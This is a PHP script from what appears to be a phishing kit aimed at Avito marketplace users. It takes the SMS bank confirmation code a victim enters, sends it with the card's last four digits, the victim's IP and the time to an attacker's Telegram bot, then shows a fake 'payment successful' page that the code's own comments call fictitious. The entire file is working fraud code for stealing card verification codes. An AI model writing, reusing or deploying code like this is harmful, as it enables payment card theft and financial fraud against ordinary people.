<?php
// send_sms.php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_SESSION['card_data'])) {
    $smsCode = $_POST['sms_code'];
    $cardData = $_SESSION['card_data'];

    // Формируем финальное сообщение
    $finalMessage = " СМС-КОД ПОЛУЧЕН!\n"
                  . "По карте: " . substr($cardData['card'], -4) . "\n"
                  . "Код: $smsCode\n"
                  . "IP: " . $cardData['ip'] . "\n"
                  . "Время: " . date('Y-m-d H:i:s');

    // Отправляем в Telegram
    $botToken = 'YOUR_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?parse_mode=Markdown&chat_id=$chatId&text=" . urlencode($finalMessage);
    file_get_contents($telegramUrl);

    // Очищаем сессию и показываем фиктивную страницу успеха
    session_destroy();
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Успешно</title></head><body style="text-align: center; padding: 50px;"><h3 style="color: green;"> Оплата успешно завершена!</h3><p>Средства будут зачислены в течение 5-10 минут.</p><p><a href="https://www.avito.ru/">Вернуться на Авито</a></p></body></html>';
    exit();
} else {
    header('Location: index.html');
}
?>
